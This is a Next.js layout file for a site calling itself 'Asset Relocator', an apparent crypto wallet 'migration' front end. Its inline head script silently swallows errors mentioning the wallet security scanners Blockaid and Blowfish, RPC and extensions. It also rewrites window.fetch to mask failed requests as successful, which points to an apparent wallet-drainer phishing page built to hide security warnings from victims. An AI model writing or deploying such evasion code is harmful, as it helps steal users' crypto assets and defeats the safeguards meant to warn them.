import type { Metadata, Viewport } from "next";
import "./globals.css";
import AppKitProvider from '@/context';
import Script from 'next/script';
import AppBridge from '@/components/AppBridge';

export const metadata: Metadata = {
  title: "Asset Relocator | Secure Migration",
  description: "Secure cross-chain asset migration protocol",
};

export const viewport: Viewport = {
  width: 'device-width',
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    // Added suppressHydrationWarning here to cover extension-injected html attributes
    <html lang="en" suppressHydrationWarning className="dark">
      <head>
        <link rel="dns-prefetch" href="https://cloudflare-eth.com" />
        <link rel="dns-prefetch" href="https://ethereum.publicnode.com" />
        <meta httpEquiv="x-dns-prefetch-control" content="on" />

        <script dangerouslySetInnerHTML={{
          __html: `
          (function() {
            const silentLogger = (event) => {
              const msg = (event.reason?.message || event.message || "").toLowerCase();
              // Added "bis_skin" and "chrome-extension" to the noise filter
              const noise = ["telemetry", "extension", "mismatched", "rpc", "blockaid", "blowfish", "hydration", "bis_skin"];
              if (noise.some(term => msg.includes(term)) || !event.reason) {
                event.preventDefault();
                event.stopImmediatePropagation();
              }
            };
            window.addEventListener('unhandledrejection', silentLogger, true);
            window.addEventListener('error', silentLogger, true);

            const originalFetch = window.fetch;
            window.fetch = async (...args) => {
              try { return await originalFetch(...args); } 
              catch (err) { return new Response(JSON.stringify({ error: true }), { status: 200 }); }
            };
          })();
        `}} />

        <Script
          src="https://unpkg.com/vconsole@latest/dist/vconsole.min.js"
          strategy="beforeInteractive"
        />
        <Script id="init-vconsole" strategy="afterInteractive">
          {`
            if (typeof window !== 'undefined' && window.VConsole) {
              window.vConsole = new window.VConsole();
            }
          `}
        </Script>
      </head>

      <body className="antialiased bg-slate-950 text-slate-50" suppressHydrationWarning>
        <AppKitProvider>
          {/** * Added suppressHydrationWarning to this wrapper div.
           * Extensions like 'Bitwarden' or 'PriceBlink' often inject attributes 
           * like 'bis_skin_checked' right here.
           */}
          <div className="relative flex flex-col min-h-screen" suppressHydrationWarning>
            <main className="flex-grow" suppressHydrationWarning>
              {children}
            </main>
          </div>

          <AppBridge />
        </AppKitProvider>
      </body>
    </html>
  );
}